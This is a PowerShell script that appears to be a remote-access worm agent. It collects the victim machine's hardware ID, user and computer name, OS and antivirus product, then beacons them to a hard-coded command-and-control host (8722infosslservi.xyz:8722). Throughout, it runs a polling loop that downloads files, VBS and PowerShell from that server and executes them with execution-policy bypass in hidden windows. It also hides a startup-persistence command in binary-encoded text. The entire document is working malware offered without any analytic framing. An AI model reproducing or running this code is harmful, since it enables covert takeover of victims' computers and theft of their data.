Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName Microsoft.VisualBasic

$httpobj = [Microsoft.VisualBasic.Interaction]::CreateObject("Microsoft.XMLHTTP")
$h = "8722infosslservi.xyz"
$p = "8722"
$VbsPath = "%Vbspath%"
$STUPCopy = "%Startup%"
$spl = "|V|"
$ErrorActionPreference = 'SilentlyContinue'

function Ins() {
    $Destination = [System.Environment]::GetFolderPath(4 + 3) + "\" + "SystemTray64.js"
    if ($STUPCopy -eq "True") {
       $Command = (Binary2String(",.,,,,..,..,....,...,,,,,....,,.,,.,..,.,.,,.,,.,...,.,,,..,,.,.,..,..,.".Replace(",", "0").Replace(".", "1"))) + " '" + $VbsPath + "' '" + $Destination + "'"
       #Invoke-Expression $Command
    }
}

function Get-AntivirusName {
[cmdletBinding()]     
param ( 
[string]$ComputerName = "$env:computername" , 
$Credential 
) 
    BEGIN  
        {
            $wmiQuery = "SELECT * FROM AntiVirusProduct"
        }
    PROCESS  
        {
            $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters          
            return $AntivirusProduct.displayName
        } 
    END { 
        } 
}

Function Binary2String([String] $data) {
    $byteList = [System.Collections.Generic.List[Byte]]::new()
    for ($i = 0; $i -lt $data.Length; $i +=8) {
        $byteList.Add([Convert]::ToByte($data.Substring($i, 8), 2))
    }
    return [System.Text.Encoding]::ASCII.GetString($byteList.ToArray())
}

function POST($DA, $Param) {
$ResponseText = ""
try
{
$httpobj.Open("POST", "http://" + $h + ":" + $p + "/" + $DA, $false)
$httpobj.SetRequestHeader("User-Agent:", $info)
$httpobj.Send($Param)
$ResponseText = [System.Convert]::ToString($httpobj.ResponseText)
} catch { }
return $ResponseText
}

function inf {
    $av = Get-AntivirusName
    $vr = "v2.0"
    $mac = HWID($env:computername)
    $id = $wormID + "" + $mac
    $os = [Microsoft.VisualBasic.Strings]::Split((Get-WMIObject win32_operatingsystem).name,"|")[0] + " " + (Get-WmiObject Win32_OperatingSystem).OSArchitecture
    return $id + "\" + ($env:COMPUTERNAME) + "\" + ($env:UserName) + "\" + $os + "\" + $av + "\" + "Yes" + "\" + "Yes" + "\" + "FALSE" + "\"
}

function HWID($strComputer) {
$ErrorActionPreference = 'SilentlyContinue'
    $lol = [System.Convert]::ToString((get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID))
    return ([Microsoft.VisualBasic.Strings]::Split($lol,'-')[0] + [Microsoft.VisualBasic.Strings]::Split($lol,'-')[1])
}

$info = inf
Ins

while($true)
{
$A = [Microsoft.VisualBasic.Strings]::Split((POST("Vre", "")) , $spl)
switch($A[0]) {
  "RF" {
    $TargetPath = [System.IO.Path]::GetTempPath() + $A[2]
    [System.IO.File]::WriteAllBytes($TargetPath, [System.Text.Encoding]::Default.GetBytes($A[1]))
    [System.Diagnostics.Process]::Start($TargetPath)
  break }
  "TR" {
    [String] $PsFileName =  [System.Guid]::NewGuid().ToString().Replace("-", "") + ".PS1"
    $TargetPath = [System.IO.Path]::GetTempPath() + $PsFileName
    [System.IO.File]::WriteAllText($TargetPath, $A[1])
    Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $TargetPath

    #[System.IO.File]::WriteAllText([System.Environment]::GetFolderPath(7) + "\" + $PsFileName.Replace(".PS1", ".cmd"), "Powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -File " + $TargetPath)
  break }
  "exc" {
    $Filename = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}) + ".vbs"
    $TargetPath = [System.IO.Path]::GetTempPath() + $Filename
    $CurrSc = $A[1]
    [System.IO.File]::WriteAllText($TargetPath, $CurrSc)
    [System.Diagnostics.Process]::Start($TargetPath)
  break }
  "Sc" {
    $TargetPath = [System.IO.Path]::GetTempPath() + $A[2]
    [System.IO.File]::WriteAllText($TargetPath, $A[1])
    [System.Diagnostics.Process]::Start($TargetPath)
  break }
"Cl" {
    [System.Environment]::Exit(0)
  break }
  "Un" {
    [System.Environment]::Exit(0)
  break }
  }
[System.Threading.Thread]::Sleep(3000)
}